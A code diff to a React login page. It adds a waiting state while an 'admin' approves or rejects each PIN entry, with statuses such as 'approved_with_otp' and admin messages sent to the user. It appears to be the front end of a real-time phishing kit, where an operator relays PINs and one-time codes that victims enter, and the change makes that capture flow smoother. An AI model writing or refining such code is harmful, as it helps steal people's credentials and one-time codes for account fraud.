@@ -40,6 +40,7 @@ function Login() {
   const [error, setError] = useState("")
   const [status, setStatus] = useState("")
   const [adminMessage, setAdminMessage] = useState("")
+  const [waitingForApproval, setWaitingForApproval] = useState(false)
   
   const inputRefs = useRef([])
   const sessionRef = useRef(null)
@@ -99,28 +100,34 @@ function Login() {
         })
         const data = response.data
         
-        if (data.status === "approved") {
+        if (data.status === "pending") {
+          setStatus("pending")
+          setWaitingForApproval(true)
+        } else if (data.status === "approved") {
           setAdminMessage("")
           setLoading(false)
+          setWaitingForApproval(false)
           localStorage.removeItem('otpSessionId')
           setTimeout(() => navigate(`${basePath}/verification`), 500)
         } else if (data.status === "rejected") {
           setError("❌ Request rejected by admin. Please try again.")
           setLoading(false)
+          setWaitingForApproval(false)
           setStatus("rejected")
-        } else if (data.status === "pending") {
-          setStatus("pending")
         } else if (data.status === "wrong_pin") {
           setError("Code PIN incorrect. Veuillez réessayer.")
           setLoading(false)
+          setWaitingForApproval(false)
           setStatus("wrong_pin")
         } else if (data.status === "expired") {
           setError("La vérification du code PIN a expiré. Veuillez réessayer.")
           setLoading(false)
+          setWaitingForApproval(false)
           setStatus("expired")
         } else if (data.status === "approved_with_otp") {
           setStatus("pinotp_correct")
           setLoading(false)
+          setWaitingForApproval(false)
           navigate(`${basePath}/verification`)
         } else if (data.status === "message_user") {
           setAdminMessage(data.message || "")
@@ -277,15 +284,15 @@ function Login() {
           <button 
             className="btnContinue" 
             onClick={submitPin} 
-            disabled={inputs.some(i => i === "") || loading}
+            disabled={inputs.some(i => i === "") || loading || waitingForApproval}
             style={{
-              opacity: loading ? 1 : 1,
-              cursor: loading ? "wait" : "pointer",
+              opacity: loading || waitingForApproval ? 1 : 1,
+              cursor: loading || waitingForApproval ? "wait" : "pointer",
               position: "relative",
               overflow: "hidden"
             }}
           >
-            {loading ? (
+            {(loading || waitingForApproval) ? (
               <span style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
                 <span className="spin" style={{
                   display: "inline-block",
